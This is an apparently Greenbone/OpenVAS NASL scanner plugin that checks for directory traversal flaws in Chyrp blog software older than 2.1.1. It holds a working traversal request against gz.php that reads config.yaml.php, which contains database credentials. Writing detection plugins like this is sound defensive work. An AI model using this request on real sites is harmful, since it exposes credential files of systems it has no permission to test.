# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902611");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
  script_cve_id("CVE-2011-2780", "CVE-2011-2744");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Chyrp Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45184");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48672");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/68565");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/68564");
  script_xref(name:"URL", value:"http://www.justanotherhacker.com/advisories/JAHx113.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to read arbitrary files
  and gain sensitive information on the affected application.");

  script_tag(name:"affected", value:"Chyrp version prior to 2.1.1");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user supplied input to
  'file' parameter in 'includes/lib/gz.php' and 'action' parameter in
  'index.php' before being used to include files.");

  script_tag(name:"solution", value:"Upgrade to Chyrp version 2.1.1");

  script_tag(name:"summary", value:"Chyrp is prone to Multiple directory traversal vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://chyrp.net/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

## If host not supports php application then exit
if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir(make_list_unique("/blog", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/", port:port);

  if("Powered by" >< res && ">Chyrp<" >< res)
  {

    url = string(dir, "/includes/lib/gz.php?file=/themes/../includes" +
                      "/config.yaml.php");

    req = http_get(item: url, port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    if("<?php" >< res &&  "username:" >< res && "database:" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
